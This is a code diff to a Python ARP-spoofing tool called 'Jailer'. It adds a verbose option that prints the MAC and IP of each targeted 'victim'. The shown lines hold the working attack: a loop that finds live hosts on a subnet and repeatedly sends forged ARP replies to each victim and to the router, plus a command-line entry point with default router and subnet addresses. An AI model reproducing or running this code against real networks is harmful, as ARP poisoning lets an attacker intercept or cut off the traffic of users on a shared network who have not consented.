@@ -11,11 +11,12 @@ from shutil import which
 class Jailer:
     all_computer = "ff:ff:ff:ff:ff:ff"
 
-    def __init__(self, initIP, cidr, routerIP, interval=300):
+    def __init__(self, initIP, cidr, routerIP, interval=300, verbose=False):
         self.initIP = initIP
         self.cidr = cidr
         self.routerIP = routerIP
         self.interval = interval
+        self.verbose = verbose
         self.blacklist = self.getBlacklist()
         self.checkTCPDump()
 
@@ -52,7 +53,7 @@ class Jailer:
         while time.time() <= timer + self.interval:
             for _ in found:
                 if self.isAlive(_):
-                    self.spoof(router, _)
+                    self.spoof(router, _, verbose=self.verbose)
                 time.sleep(0.2)
 
             # avoid 99% cpu usage
@@ -119,8 +120,10 @@ class Jailer:
             return False
 
     @staticmethod
-    def spoof(router, victim):
+    def spoof(router, victim, verbose=False):
         # router = {"ip":"", "mac":""}
+        if int(time.time()) % 3 == 0 and verbose:
+            print(victim.get("mac"), victim.get("ip"))
         send(ARP(op=2, pdst=victim.get("ip"), psrc=router.get("ip"),
                  hwdst=victim.get("mac")), verbose=False)
         send(ARP(op=2, pdst=router.get("ip"), psrc=victim.get("ip"),
@@ -139,8 +142,10 @@ if __name__ == "__main__":
     parser.add_argument('--router', default="10.2.255.254", help="router IP")
     parser.add_argument('--init', default="10.2.1.0", help="initial IP")
     parser.add_argument('--cidr', default="24")
+    parser.add_argument('-v', '--verbose', action='store_true')
     args = parser.parse_args()
 
     # jail(routerIP, interval)
-    j = Jailer(args.init, args.cidr, args.router, args.interval)
+    j = Jailer(args.init, args.cidr, args.router,
+               args.interval, verbose=args.verbose)
     j.execute()
